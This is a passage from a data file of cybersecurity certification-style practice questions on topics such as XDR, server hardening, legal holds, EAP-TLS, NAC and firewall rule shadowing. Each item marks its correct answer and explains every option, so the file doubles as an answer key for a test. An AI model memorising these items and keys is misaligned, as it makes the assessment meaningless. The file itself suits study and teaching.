 q:"An MSP already runs endpoint agents that record process activity and can isolate a host. Analysts complain that they must manually pivot between the endpoint console, the email gateway, and the identity provider to understand one attack. Which of the following would BEST unify these sources with automated correlation?",
 o:[
  {t:"XDR",ok:true,x:"Extended detection and response ingests telemetry from endpoints, email, identity, network, and cloud, correlating them into single incidents. It directly addresses the multi-console problem."},
  {t:"A second EDR agent from a different vendor",ok:false,x:"Endpoint-only visibility is what they already have; another EDR adds coverage on the same layer without connecting email or identity data."},
  {t:"A host-based intrusion prevention system",ok:false,x:"HIPS blocks known-bad activity on a single host. It does not correlate events across email and identity systems."},
  {t:"NetFlow collection on the core switch",ok:false,x:"Flow data adds network metadata but does nothing to integrate the existing endpoint, email, and identity consoles."}
 ],
 w:"EDR = endpoint telemetry and response. XDR = the same idea extended across endpoint, email, identity, network, and cloud with cross-source correlation."},
{id:"c031",obj:"2.4",d:2,cat:"attacks",t:"mc",
 q:"A city's public website has become sluggish, and the hosting bill for the month tripled. An administrator captures the process listing below on the web server. Which of the following is the MOST likely explanation?",
 ex:"$ top -b -n 1 | head -6\nPID   USER    %CPU  %MEM  TIME+      COMMAND\n4412  www     396   2.1   1811:04    ./.cache/kthreadd\n1180  www     3     4.0   12:31      nginx: worker\n 950  mysql   2     11.3  40:12      mysqld",
 o:[
  {t:"Cryptomining malware is running under the web account, producing a resource consumption indicator",ok:true,x:"A process named to mimic a kernel thread, launched from a hidden directory as the www user and pinning several cores for days, is classic mining malware. Sustained CPU and cost spikes are the resource consumption indicator."},
  {t:"The site is receiving legitimate traffic growth and needs more capacity",ok:false,x:"Legitimate load would show up as busy nginx and mysqld processes, not a fake kernel thread running from a hidden cache directory."},
  {t:"A distributed denial of service is saturating the server's network link",ok:false,x:"A DDoS would exhaust bandwidth or connections and load the web workers; it would not create a new hidden process consuming CPU."},
  {t:"The database is performing a scheduled index rebuild",ok:false,x:"mysqld is using only 2% CPU. The consumption comes from the suspicious process, not the database."}
 ],
 w:"Unexplained sustained CPU, memory, or cloud spend from an unfamiliar process is a resource consumption indicator; look for disguised names and hidden paths."},

{id:"c032",obj:"5.1",d:5,cat:"gov",t:"mc",
 q:"A consultancy discovers that a consultant has been running a personal cryptocurrency-mining program on a company laptop during off hours, with no data compromised. HR asks which document the consultant has violated. Which of the following is the MOST appropriate answer?",
 o:[
  {t:"The acceptable use policy",ok:true,x:"The AUP defines what employees may and may not do with company equipment and resources. Personal mining on a corporate laptop is a textbook AUP violation regardless of data impact."},
  {t:"The incident response policy",ok:false,x:"The IR policy governs how the organization detects and handles security incidents; it does not set rules for individual employee use of equipment."},
  {t:"The business continuity policy",ok:false,x:"Business continuity covers keeping operations running during disruptions and is unrelated to personal misuse of a laptop."},
  {t:"The encryption standard",ok:false,x:"An encryption standard specifies algorithms and key lengths. Nothing about encryption was violated here."}
 ],
 w:"The AUP is the document that sets rules for personal versus business use of company systems; it is what employees sign at onboarding."},

{id:"c033",obj:"4.1",d:4,cat:"harden",t:"ms",pick:3,
 q:"An MSP is hardening a newly built Linux web server for a small law firm before it goes online. Which THREE of the following steps are appropriate hardening actions for this server?",
 o:[
  {t:"Remove packages and services that the web role does not need",ok:true,x:"Every unused package is a potential vulnerability and patch obligation. Removing unnecessary software shrinks the attack surface."},
  {t:"Enable the host-based firewall to permit only 443 and management from the admin subnet",ok:true,x:"A host firewall restricts exposure to the ports the role requires, even if the network firewall is misconfigured."},
  {t:"Replace all default and vendor-supplied credentials before connecting the host to the network",ok:true,x:"Default passwords are among the first things attackers try; changing them prior to exposure is a core hardening step."},
  {t:"Run the web service as root so it can bind to port 443 without extra configuration",ok:false,x:"Running as root gives any web exploit full system control. Proper practice is a low-privilege service account with capabilities or a reverse proxy."},
  {t:"Disable logging to reduce disk usage on the server",ok:false,x:"Logs are essential for detection and forensics; disabling them removes visibility rather than hardening anything."},
  {t:"Enable Telnet for emergency remote access in case SSH fails",ok:false,x:"Telnet transmits credentials in cleartext and adds an insecure open port; it is the opposite of hardening."}
 ],
 w:"Hardening a server = remove what is unnecessary, restrict ports with a host firewall, change defaults, patch, least privilege, and keep logging on."},

{id:"c034",obj:"2.2",d:2,cat:"social",t:"mc",
 q:"An MSP's security lead proactively registers several misspelled variants of the MSP's own domain, such as versions with a swapped letter pair or a missing character, and points them at a warning page. Which of the following threats is the lead mitigating?",
 o:[
  {t:"Typosquatting",ok:true,x:"Typosquatting registers lookalike misspellings so that users who mistype a URL, or click a lookalike link, land on an attacker page. Owning the variants first denies that opportunity."},
  {t:"Watering hole attack",ok:false,x:"A watering hole compromises a legitimate site that targets already visit; registering spare domains does not affect that."},
  {t:"DNS cache poisoning",ok:false,x:"Cache poisoning injects false answers for the real domain into a resolver. Owning misspelled domains does not protect the resolution of the genuine name."},
  {t:"Vishing",ok:false,x:"Vishing is a voice-call attack and has no connection to domain registration."}
 ],
 w:"Typosquatting = lookalike domains that catch mistyped or misread URLs. Defensive registration and user awareness are the main mitigations."},

{id:"c035",obj:"3.3",d:3,cat:"data",t:"mc",
 q:"A consultancy needs to give an offshore analytics team a copy of a client's customer table so they can test a reporting tool. The team must not see real names or phone numbers, but the values need to look realistic and keep their format so the tool works. Which of the following data protection methods is MOST appropriate?",
 o:[
  {t:"Data masking that substitutes realistic but fake values while preserving format",ok:true,x:"Masking replaces sensitive fields with plausible substitutes of the same length and type, so the test copy is useful without exposing real customer data."},
  {t:"Encrypting the entire table with AES-256 before sending it",ok:false,x:"Encrypted data is unreadable to the reporting tool; the analytics team would need the key, which would then reveal the real values."},
  {t:"Hashing each name and phone number with SHA-256",ok:false,x:"Hashes are fixed-length strings that no longer look like names or phone numbers, so the tool's format-dependent tests would fail."},
  {t:"Applying a geographic restriction so only domestic users can open the file",ok:false,x:"A geographic restriction would block the offshore team entirely rather than let them work with a safe copy."}
 ],
 w:"Masking = realistic fake values for testing and display; tokenization = reversible substitute via a vault; encryption = unreadable without the key."},

{id:"c036",obj:"5.2",d:5,cat:"gov",t:"mc",
 q:"An MSP performs a formal risk assessment for each client every January. In August, a widely exploited zero-day is announced in the VPN appliances used by most clients, and the MSP immediately convenes a special assessment of exposure. Which of the following BEST describes the August assessment?",
 o:[
  {t:"Ad hoc",ok:true,x:"An ad hoc assessment is performed on demand in response to a specific event, such as a newly disclosed critical vulnerability, outside the normal schedule."},
  {t:"Recurring",ok:false,x:"The January assessment is the recurring one; the August review was unscheduled and triggered by a specific event."},
  {t:"Continuous",ok:false,x:"Continuous assessment is ongoing, automated monitoring of risk indicators, not a one-off meeting called after an announcement."},
  {t:"One-time",ok:false,x:"A one-time assessment is done once for a project or system and never repeated. This review is event-driven and may recur whenever a similar event occurs."}
 ],
 w:"Recurring = scheduled; ad hoc = triggered by an event; continuous = ongoing monitoring; one-time = single project-based assessment."},

{id:"c037",obj:"4.8",d:4,cat:"ir",t:"mc",
 q:"A city receives notice that a former employee is suing over a termination. The city's email system automatically deletes messages older than 18 months. Which of the following should the IT department do FIRST?",
 o:[
  {t:"Place a legal hold that suspends automatic deletion for the relevant mailboxes and records",ok:true,x:"Once litigation is reasonably anticipated, relevant data must be preserved. A legal hold overrides the retention schedule so evidence is not destroyed before e-discovery."},
  {t:"Export the former employee's mailbox to a USB drive and give it to the city attorney",ok:false,x:"Ad hoc copying without preservation of the source and without documented handling risks integrity challenges; preservation comes first, then controlled collection."},
  {t:"Reduce the retention period so unrelated old mail is removed sooner",ok:false,x:"Shortening retention while litigation is pending could destroy relevant evidence and expose the city to sanctions for spoliation."},
  {t:"Begin forensic analysis of the former employee's workstation",ok:false,x:"Analysis may happen later, but the immediate risk is scheduled deletion of email; stopping that loss is the first priority."}
 ],
 w:"Legal hold = preserve potentially relevant data by suspending normal deletion as soon as litigation is anticipated. Preserve first, collect second, analyze third."},

{id:"c038",obj:"1.4",d:1,cat:"crypto",t:"mc",
 q:"A city is standing up an internal certificate authority for employee smart cards. The CA's private key must never be exportable, signing operations must occur inside tamper-resistant hardware, and the device must support a high volume of signatures. Which of the following should be used?",
 o:[
  {t:"A hardware security module",ok:true,x:"An HSM is a dedicated, tamper-resistant appliance for generating, storing, and using keys at scale, which matches a CA's need for non-exportable keys and high signing throughput."},
  {t:"The TPM on the CA server's motherboard",ok:false,x:"A TPM protects keys for a single host (disk encryption, attestation) but is not designed for the throughput or lifecycle features of a CA signing key."},
  {t:"A cloud key management service",ok:false,x:"A KMS manages keys for cloud workloads and may itself be backed by an HSM, but the city wants an internal, on-premises device it fully controls for the CA."},
  {t:"A secure enclave on an administrator's laptop",ok:false,x:"A secure enclave isolates secrets on a single endpoint; a CA key cannot live on one person's laptop."}
 ],
 w:"TPM = per-device key protection; HSM = dedicated appliance for high-value keys and bulk crypto; KMS = cloud key lifecycle service; secure enclave = isolated processor area on a device."},

{id:"c039",obj:"2.4",d:2,cat:"attacks",t:"mc",
 q:"An MSP-managed server exposes RDP to the internet. The security log shows the entries below for a single account, followed by a lockout. Which of the following attacks does this indicate?",
 ex:"EventID 4625  Logon failure  Account: administrator  Src: 203.0.113.61  Reason: bad password\nEventID 4625  Logon failure  Account: administrator  Src: 203.0.113.61  Reason: bad password\n(... 2,900 identical events over 25 minutes ...)\nEventID 4740  Account locked out  Account: administrator",
 o:[
  {t:"Brute force against one account, with the lockout as the indicator",ok:true,x:"Thousands of rapid password attempts on the same account from one source until it locks out is the definition of an online brute-force attack."},
  {t:"Password spraying across the domain",ok:false,x:"Spraying tries one password against many accounts and specifically avoids lockouts. This is one account with many passwords."},
  {t:"Credential stuffing",ok:false,x:"Stuffing uses leaked username and password pairs, one attempt per account, with some successes. Here the same account fails repeatedly."},
  {t:"A replay of a captured session token",ok:false,x:"A replay attack reuses a valid captured credential and would succeed without generating thousands of bad-password failures."}
 ],
 w:"Brute force = one account, many passwords, often ending in lockout. Fix: remove internet-exposed RDP, use a VPN or gateway, enforce MFA and lockout."},

{id:"c040",obj:"4.1",d:4,cat:"harden",t:"mc",dg:"dot1x",
 q:"A consultancy's new office needs Wi-Fi where each laptop authenticates with a certificate issued by the corporate CA, no passwords are sent over the air, and the access points hand authentication to a central server. Which of the following configurations meets these requirements?",
 o:[
  {t:"WPA3-Enterprise using EAP-TLS with a RADIUS server",ok:true,x:"Enterprise mode uses 802.1X: the AP forwards EAP to RADIUS, and EAP-TLS performs mutual certificate authentication with no password exchanged."},
  {t:"WPA3-Personal with a long passphrase distributed via MDM",ok:false,x:"Personal mode uses a shared secret rather than per-device certificates and has no central authentication server."},
  {t:"WPA2-Enterprise using PEAP with MSCHAPv2",ok:false,x:"PEAP-MSCHAPv2 authenticates users with a password inside a TLS tunnel, which conflicts with the requirement for certificate-only, password-free authentication."},
  {t:"Open network with a captive portal requiring corporate login",ok:false,x:"An open network has no link-layer encryption, and the portal login uses passwords instead of certificates."}
 ],
 w:"EAP-TLS = certificate on both sides, no password. Enterprise Wi-Fi = 802.1X supplicant, authenticator (AP), and RADIUS authentication server."},

{id:"c041",obj:"5.4",d:5,cat:"gov",t:"mc",
 q:"A city collects residents' personal information for utility accounts and contracts an MSP to host and back up the billing database. The MSP acts only on the city's written instructions and makes no decisions about how the data is used. Under privacy regulations, which of the following BEST describes the MSP's role?",
 o:[
  {t:"Data processor",ok:true,x:"A processor handles personal data on behalf of and under the instructions of another party without deciding the purposes or means. That is exactly the MSP's position."},
  {t:"Data controller",ok:false,x:"The controller determines why and how personal data is processed. The city, which collects the data and gives the instructions, is the controller."},
  {t:"Data subject",ok:false,x:"Data subjects are the individuals the information is about, in this case the residents."},
  {t:"Data owner",ok:false,x:"The owner is the internal role accountable for a data set's classification and protection, which sits with the city, not with the contracted host."}
 ],
 w:"Controller decides purpose and means; processor acts on the controller's instructions; subject is the person the data describes."},

{id:"c042",obj:"3.4",d:3,cat:"data",t:"mc",
 q:"A city wants to validate its disaster recovery plan for the 911 dispatch application by bringing the recovery site fully online and processing live call data there for a day while the primary site continues to operate normally. Which of the following test types is being performed?",
 o:[
  {t:"Parallel processing",ok:true,x:"Running the recovery environment alongside production with real workload, without cutting the primary over, is a parallel processing test. It proves the alternate site works without risking the live service."},
  {t:"Tabletop exercise",ok:false,x:"A tabletop is a discussion-based walkthrough with no systems activated."},
  {t:"Failover test",ok:false,x:"A failover test actually switches production to the secondary site; here the primary keeps serving throughout."},
  {t:"Simulation",ok:false,x:"A simulation stages a scenario for responders to react to; it does not require the full recovery site to process real transactions in parallel."}
 ],
 w:"Tabletop = talk through; simulation = practice a scenario; parallel = run both sites; failover = actually switch production."},

{id:"c043",obj:"2.2",d:2,cat:"social",t:"mc",
 q:"Two days before a city bond vote, coordinated social media accounts begin posting fabricated lab results claiming the municipal water supply is contaminated, along with a doctored screenshot of a city press release. Which of the following BEST describes this activity?",
 o:[
  {t:"Disinformation intended to influence public behavior",ok:true,x:"Deliberately fabricated content spread in a coordinated way to manipulate an outcome is disinformation. The doctored press release and timing show intent rather than honest error."},
  {t:"Brand impersonation to harvest credentials",ok:false,x:"There is no login page or credential theft; the goal is to sway opinion, not capture accounts."},
  {t:"A watering hole attack on residents",ok:false,x:"No website is compromised and no malware is delivered; the vector is false information."},
  {t:"Phishing of the city clerk's office",ok:false,x:"Nothing was sent to city staff to trick them into an action; the content targets the public."}
 ],
 w:"Misinformation = false content shared without intent to deceive; disinformation = deliberately fabricated to manipulate. Both are social engineering at population scale."},

{id:"c044",obj:"4.7",d:4,cat:"ops",t:"ms",pick:2,
 q:"An MSP wants to automate two problems: new client employees wait days for accounts, and engineers keep creating cloud storage buckets that are accidentally public. Which TWO of the following automation use cases directly address these problems?",
 o:[
  {t:"User provisioning driven by the client's HR system through an API",ok:true,x:"Automated provisioning creates accounts and permissions as soon as HR records a hire, eliminating the multi-day manual wait."},
  {t:"Guard rails that automatically block or revert public bucket policies at creation time",ok:true,x:"Guard rails enforce policy automatically so the misconfiguration cannot persist, regardless of the engineer's mistake."},
  {t:"Continuous integration that runs unit tests on every code commit",ok:false,x:"CI testing improves code quality but does nothing about account creation delays or public storage."},
  {t:"Automated ticket escalation when a SIEM alert exceeds a severity threshold",ok:false,x:"Escalation speeds up incident handling; it is not related to onboarding or bucket configuration."},
  {t:"Scheduled disabling of unused services on client servers",ok:false,x:"Turning off idle services is a hardening task, not a fix for either stated problem."}
 ],
 w:"Match the automation use case to the problem: provisioning for account lifecycle, guard rails for preventing misconfiguration, escalation and ticketing for response."},

{id:"c045",obj:"1.4",d:1,cat:"crypto",t:"mc",
 q:"An MSP deploys an internal ticketing portal for a client. The portal uses a certificate issued by the client's own internal CA, and every employee's browser shows a warning that the site is not trusted. Which of the following is the BEST way to eliminate the warnings without buying a public certificate?",
 o:[
  {t:"Distribute the internal CA's root certificate to all workstations as a trusted root",ok:true,x:"Browsers warn because they have no root of trust for the issuing CA. Pushing the internal root into the trusted store makes every certificate chained to it valid."},
  {t:"Replace the certificate with a self-signed one",ok:false,x:"A self-signed certificate has no issuing CA at all and would produce the same warning on every workstation."},
  {t:"Add the portal's IP address to the CRL",ok:false,x:"The CRL lists revoked certificates; adding anything to it would make trust worse, and CRLs do not hold IP addresses."},
  {t:"Generate a new CSR with a longer key",ok:false,x:"Key length has nothing to do with the warning; the certificate is untrusted because of the chain, not the key size."}
 ],
 w:"A certificate is trusted only if its chain reaches a root the client already trusts. Internal CAs work when the root is distributed to endpoints."},

{id:"c046",obj:"5.6",d:5,cat:"third",t:"ms",pick:3,
 q:"A consultancy is updating its insider threat awareness module. Which THREE of the following behaviors should the training tell employees to report as potentially anomalous?",
 o:[
  {t:"A colleague repeatedly asks for access to client files that are unrelated to their assignments",ok:true,x:"Requests for data outside someone's role are a recognized insider threat indicator and should be reported for review."},
  {t:"A teammate begins copying large volumes of project data to personal cloud storage shortly after giving notice",ok:true,x:"Bulk transfers to personal storage, especially by a departing employee, are a classic data exfiltration warning sign."},
  {t:"An employee is seen photographing a whiteboard containing client network diagrams",ok:true,x:"Capturing sensitive diagrams by unmanaged means bypasses controls and is a physical and operational security concern worth reporting."},
  {t:"A colleague takes approved vacation and sets an out-of-office reply",ok:false,x:"Normal, approved absence is not an indicator of anything; reporting it would generate noise."},
  {t:"A teammate asks the help desk to reset their own password after forgetting it",ok:false,x:"Routine self-service password resets are expected behavior, not a warning sign."},
  {t:"An employee attends an external industry conference",ok:false,x:"Professional development is ordinary activity and is not an insider threat indicator."}
 ],
 w:"Awareness training should teach staff to recognize and report anomalous behavior: out-of-role access requests, unusual data movement, and bypassing controls."},

{id:"c047",obj:"4.5",d:4,cat:"ops",t:"mc",
 q:"A consultancy allows staff and visiting clients to plug into conference-room ports. It wants any device with outdated antivirus or missing patches to be placed on a remediation network until fixed, while healthy corporate devices get normal access. Which of the following should be implemented?",
 o:[
  {t:"Network access control with posture assessment",ok:true,x:"NAC checks a device's health (patches, AV, configuration) before granting access and can quarantine non-compliant hosts on a remediation VLAN."},
  {t:"A web application firewall",ok:false,x:"A WAF inspects HTTP traffic to web applications; it does not evaluate endpoint health or assign network access."},
  {t:"File integrity monitoring on the switches",ok:false,x:"FIM alerts on changes to protected files; it is not a mechanism for admitting or quarantining devices."},
  {t:"A DNS filter on the guest network",ok:false,x:"DNS filtering blocks resolution of malicious names but cannot assess patch levels or move devices between networks."}
 ],
 w:"NAC = admission control based on identity and device posture, with quarantine or remediation for non-compliant endpoints."},

{id:"c048",obj:"2.4",d:2,cat:"attacks",t:"mc",
 q:"A consultancy's identity dashboard shows one consultant's SaaS account with two active sessions at the same moment: one from the consultant's managed laptop in Denver and one from an unmanaged browser in another country. The consultant confirms only one session is theirs. Which of the following indicators is this?",
 o:[
  {t:"Concurrent session usage indicating a compromised account",ok:true,x:"Two simultaneous active sessions from different devices and countries, one unrecognized by the user, is the concurrent session indicator and strongly suggests stolen credentials or a stolen session token."},
  {t:"Account lockout",ok:false,x:"The account is not locked; both sessions are active and functioning."},
  {t:"Resource inaccessibility",ok:false,x:"Nothing is unavailable; the problem is extra access, not lost access."},
  {t:"Published or documented credentials",ok:false,x:"This indicator refers to credentials found posted publicly, such as in a paste site. Nothing in the scenario says the password was published."}
 ],
 w:"Concurrent sessions from mismatched locations or devices = likely account takeover. Revoke all sessions, reset credentials, and check for persistence."},

{id:"c049",obj:"3.4",d:3,cat:"arch",t:"mc",
 q:"An MSP's SIEM is operated by a single engineer who built all of the correlation rules. When that engineer is on leave for three weeks, alerts go untriaged and rule changes stall. Which of the following capacity planning considerations has the MSP neglected?",
 o:[
  {t:"People",ok:true,x:"Capacity planning includes ensuring enough trained staff and cross-training so that operations continue when one person is unavailable. A single skilled individual is a personnel single point of failure."},
  {t:"Technology",ok:false,x:"The SIEM itself is functioning; the gap is who operates it, not the platform's capacity."},
  {t:"Infrastructure",ok:false,x:"Infrastructure capacity concerns power, cooling, network, and hardware, none of which caused the outage in alert handling."},
  {t:"Compute",ok:false,x:"Compute is a resource consideration for workloads. No processing shortage is described, only a staffing one."}
 ],
 w:"Capacity planning covers people, technology, and infrastructure. Cross-training and documentation prevent a single person from being a point of failure."},

{id:"c050",obj:"4.8",d:4,cat:"ir",t:"mc",
 q:"An incident responder at a city arrives at a workstation suspected of running credential-stealing malware. The machine is powered on and logged in. The responder lists the possible evidence sources below. Which of the following should be acquired FIRST?",
 ex:"A. Contents of RAM (running processes, network connections)\nB. Files on the local SSD\nC. Last night's backup of the workstation on the file server\nD. Printed configuration sheets in the user's desk drawer",
 o:[
  {t:"The contents of RAM",ok:true,x:"Memory is the most volatile source and is lost on power-off. Running processes, injected code, and live connections exist only there, so it is captured first."},
  {t:"The files on the local SSD",ok:false,x:"Disk data persists after shutdown and can be imaged after memory is captured."},
  {t:"Last night's backup on the file server",ok:false,x:"A backup is a stable archival copy that will still exist later; it is among the last items collected."},
  {t:"The printed configuration sheets",ok:false,x:"Paper does not change on its own and can be collected at any time; it is the least volatile source."}
 ],
 w:"Order of acquisition follows volatility: CPU/cache and RAM, then swap and disk, then remote logs and backups, then archival media and paper."},

{id:"c051",obj:"5.5",d:5,cat:"third",t:"mc",
 q:"To keep receiving a federal grant, a city must show that its cybersecurity program was reviewed by a party with no stake in the outcome, and the grantor rejects reports produced by the city's own staff. Which of the following BEST satisfies the requirement?",
 o:[
  {t:"An independent third-party audit",ok:true,x:"An external audit by an unaffiliated firm provides the objectivity the grantor demands; it is precisely what self-produced reports lack."},
  {t:"A self-assessment against a published framework",ok:false,x:"A self-assessment is produced by the city itself, which the grantor has explicitly rejected."},
  {t:"A report from the city's internal audit committee",ok:false,x:"An internal audit committee is part of the city's own governance and is not independent in the sense the grantor requires."},
  {t:"A vulnerability scan performed by the MSP that manages the city network",ok:false,x:"The MSP operates the systems being evaluated and has a commercial interest, so it is not an impartial reviewer, and a scan is not a program audit."}
 ],
 w:"Internal audits and self-assessments support improvement; external independent audits provide assurance to regulators, grantors, and customers."},

{id:"c052",obj:"2.1",d:2,cat:"actors",t:"mc",
 q:"A consultancy's project team, frustrated by slow approval for a file-sharing tool, signs up for a free online service with a personal credit card and begins uploading client deliverables to it. The security team was never informed. Which of the following BEST describes this threat?",
 o:[
  {t:"Shadow IT, an internal actor with no malicious intent but unmanaged risk",ok:true,x:"Employees deploying unsanctioned technology outside IT's oversight is shadow IT. Motive is convenience, yet the data leaves controlled systems with no security review."},
  {t:"An insider threat motivated by revenge",ok:false,x:"There is no intent to harm the firm; the team is trying to get work done faster."},
  {t:"Organized crime motivated by financial gain",ok:false,x:"The actors are the firm's own employees, not an external criminal group seeking profit."},
  {t:"An unskilled attacker using off-the-shelf tools",ok:false,x:"No attack is occurring; the risk comes from unmanaged use of a legitimate service."}
 ],
 w:"Shadow IT = internal, usually well-meaning, but bypasses controls. Address with easier approved alternatives, CASB visibility, and policy."},

{id:"c053",obj:"4.9",d:4,cat:"ops",t:"mc",
 q:"City IT receives an automated weekly report showing that a public-library kiosk PC attempted connections to 400 distinct external addresses on TCP 445 within one hour. Which of the following data sources should the analyst collect FIRST to determine whether the kiosk is infected and what it is doing?",
 o:[
  {t:"Endpoint logs and process telemetry from the kiosk itself (running processes, recently created executables, EDR events)",ok:true,x:"Outbound SMB scanning is worm-like behavior. Endpoint logs identify the process responsible and how it arrived, which is the fastest path from indicator to confirmation."},
  {t:"The quarterly vulnerability scan report for the library branch",ok:false,x:"The scan shows what could be exploited, not what is running on the kiosk right now."},
  {t:"The dashboard trend of total firewall denies across the city network",ok:false,x:"Aggregate dashboards confirm a spike at best; they do not say what is on the kiosk."},
  {t:"The DHCP lease table to confirm the kiosk's current IP address",ok:false,x:"Useful housekeeping, but it adds nothing to the question of whether the host is compromised."}
 ],
 w:"Automated reports and dashboards point you to a host; endpoint logs and process data tell you what the host is doing. Collect from the host (and preserve it) before the evidence changes."},
{id:"c054",obj:"1.2",d:1,cat:"controls",t:"mc",
 q:"A consultancy's VPN concentrator uses a RADIUS server. Management asks for a monthly report showing which consultants connected, when, for how long, and how much data each transferred. Which of the following AAA functions provides this information?",
 o:[
  {t:"Accounting",ok:true,x:"Accounting records session details such as start and stop times, duration, and bytes transferred, which is exactly what a usage report requires."},
  {t:"Authentication",ok:false,x:"Authentication verifies identity at login; it establishes who the user is, not how long they stayed or what they transferred."},
  {t:"Authorization",ok:false,x:"Authorization decides what a connected user may access. It does not produce usage records."},
  {t:"Attestation",ok:false,x:"Attestation is a formal statement that something is true, such as a manager confirming an access review; it is not an AAA function."}
 ],
 w:"AAA: authentication proves identity, authorization grants rights, accounting logs usage for reporting and audit."},

{id:"c055",obj:"3.1",d:3,cat:"arch",t:"mc",
 q:"A consultancy is splitting a single client-facing application into dozens of small, independently deployed services that communicate over HTTP APIs. Which of the following is an inherent security consideration of this architecture?",
 o:[
  {t:"A larger attack surface, since each service exposes its own API that must be authenticated and secured",ok:true,x:"Microservices multiply the number of network-reachable endpoints. Each one needs authentication, authorization, TLS, and monitoring, so the surface to defend grows."},
  {t:"Inability to patch individual components without redeploying everything",ok:false,x:"Independent deployment is a strength of microservices; a monolith is the design that forces whole-application redeploys."},
  {t:"A single failure takes down the entire application",ok:false,x:"Properly designed microservices isolate failures; a whole-application outage from one bug is a monolith characteristic."},
  {t:"Services must all run on the same physical server",ok:false,x:"Microservices are usually distributed across containers and hosts; co-location is not required."}
 ],
 w:"Microservices improve scalability and deployability at the cost of more APIs to secure, more service-to-service trust to manage, and more complexity."},

{id:"c056",obj:"2.1",d:2,cat:"actors",t:"mc",
 q:"A city's finance servers are encrypted by ransomware. The attackers demand payment, threaten to publish stolen files, run a professional negotiation portal, and are known to rent their malware to affiliates for a share of profits. Which of the following BEST describes the threat actor and motivation?",
 o:[
  {t:"Organized crime motivated by financial gain",ok:true,x:"A well-resourced group operating an affiliate ransomware business with extortion tactics is organized crime, and the motivation is money."},
  {t:"A nation-state motivated by espionage",ok:false,x:"Nation-states seek intelligence or strategic disruption and rarely run public ransom negotiation portals with affiliate revenue sharing."},
  {t:"A hacktivist motivated by political change",ok:false,x:"Hacktivists deface or leak to make a statement; a profit-sharing affiliate model shows a commercial goal, not a cause."},
  {t:"An unskilled attacker motivated by chaos",ok:false,x:"Professional negotiation infrastructure and an affiliate program require significant resources and skill, far beyond an unskilled actor."}
 ],
 w:"Organized crime = well-funded, profit-driven, often ransomware-as-a-service. Nation-state = espionage or strategic disruption; hacktivist = ideology."},

{id:"c057",obj:"4.3",d:4,cat:"ops",t:"mc",
 q:"An outside researcher emails a consultancy stating that they found an authentication flaw in the firm's client portal and asks how to share the details privately so it can be fixed before anyone else discovers it. Which of the following should the consultancy have in place to handle this?",
 o:[
  {t:"A responsible disclosure program with a published contact and handling process",ok:true,x:"A disclosure program gives researchers a safe, defined channel and commits the firm to acknowledging and fixing reported flaws before public release."},
  {t:"A penetration testing rules-of-engagement document",ok:false,x:"Rules of engagement govern a contracted test the firm authorized in advance; the researcher was not engaged and the finding is unsolicited."},
  {t:"A threat feed subscription from an ISAC",ok:false,x:"Threat feeds share indicators among members; they are not a channel for an individual to report a flaw in the firm's own application."},
  {t:"A quarterly vulnerability scan schedule",ok:false,x:"Scheduled scans find known issues in the firm's own environment; they do not provide a process for receiving external reports."}
 ],
 w:"Responsible disclosure and bug bounty programs formalize how outsiders report vulnerabilities; without one, findings may be ignored or published."},

{id:"c058",obj:"5.1",d:5,cat:"gov",t:"mc",
 q:"An MSP serves 40 small businesses. Each client sets its own security policies, approves its own exceptions, and decides its own risk tolerance, while the MSP only implements what each client chooses. Which of the following governance structures does this describe?",
 o:[
  {t:"Decentralized governance",ok:true,x:"Decision-making authority sits with each individual client organization rather than one central body, which is decentralized governance."},
  {t:"Centralized governance",ok:false,x:"Centralized governance would mean one authority, such as the MSP or a single board, setting policy for everyone. Here each client decides independently."},
  {t:"A government entity",ok:false,x:"Government entities are external regulators or agencies; the clients are private businesses making their own choices."},
  {t:"An audit committee",ok:false,x:"An audit committee oversees assurance activities within one organization; it is not a description of how authority is distributed across many."}
 ],
 w:"Centralized = one authority sets policy for all; decentralized = each unit or client governs itself. Governance structures include boards, committees, and government entities."},

{id:"c059",obj:"4.5",d:4,cat:"ops",t:"mc",dg:"fwrules",
 q:"An MSP engineer adds a rule to allow a client's monitoring server at 10.50.1.20 to reach the database server on TCP 5432, but connections still fail. The firewall processes rules top-down, first match wins. Which of the following is the MOST likely cause?",
 ex:"#  Source          Destination     Port      Action\n1  any             10.50.2.0/24    any       DENY\n2  10.50.1.20      10.50.2.15      tcp/5432  ALLOW\n3  10.50.1.0/24    10.50.2.15      tcp/443   ALLOW\n4  any             any             any       DENY",
 o:[
  {t:"Rule 1 matches the traffic first and denies it, so the new rule 2 is never evaluated",ok:true,x:"Rule 1 blocks anything destined for the 10.50.2.0/24 network, which includes the database at 10.50.2.15. Because first match wins, the more specific allow beneath it is shadowed."},
  {t:"Rule 4 blocks the traffic because it is an explicit deny-all",ok:false,x:"Rule 4 is reached only if nothing above matches; the packet is already dropped at rule 1."},
  {t:"Rule 3 conflicts with rule 2 because both target the same destination",ok:false,x:"Rules 2 and 3 cover different ports and do not interfere; neither is reached anyway."},
  {t:"The port should be UDP 5432 rather than TCP",ok:false,x:"PostgreSQL uses TCP 5432; the protocol is correct. The problem is rule ordering."}
 ],
 w:"In first-match firewalls, specific allow rules must sit above broad deny rules. A broad deny near the top shadows everything below it."},

{id:"c060",obj:"2.2",d:2,cat:"actors",t:"mc",
 q:"Dozens of unrelated small businesses in a region are hit by the same ransomware on the same night. Investigation shows the attackers first compromised the remote-management platform of the MSP that serves all of them and used it to push the payload. Which of the following threat vectors BEST describes how the businesses were attacked?",
 o:[
  {t:"Supply chain, through a managed service provider",ok:true,x:"The victims were reached through a trusted provider's tooling rather than through their own defenses. MSPs are a recognized supply chain vector because one compromise fans out to every client."},
  {t:"Unsupported systems with unpatched vulnerabilities",ok:false,x:"The businesses were not exploited through their own unpatched software; the malware arrived via the MSP's legitimate management channel."},
  {t:"Removable media",ok:false,x:"No USB or physical media was involved; delivery was over the MSP's remote-management platform."},
  {t:"Message-based delivery via email",ok:false,x:"Simultaneous deployment across dozens of unrelated companies without any phishing points to the shared provider, not email."}
 ],
 w:"Supply chain vectors include MSPs, vendors, and suppliers. A compromised MSP tool becomes a distribution channel to every client at once."},

{id:"c061",obj:"3.2",d:3,cat:"netsec",t:"mc",
 q:"An MSP client has 12 branch offices, each with a broadband circuit and an LTE backup. The client wants encrypted branch-to-branch and branch-to-cloud connectivity that automatically steers traffic across whichever link is healthiest, managed from one console. Which of the following BEST fits?",
 o:[
  {t:"SD-WAN",ok:true,x:"Software-defined WAN builds encrypted overlays across multiple underlay links, applies centralized policy, and dynamically routes around degraded circuits, which is exactly the requirement."},
  {t:"A single site-to-site IPSec tunnel per branch to headquarters",ok:false,x:"Static tunnels do not steer traffic across multiple links automatically or provide direct branch-to-cloud paths and central policy."},
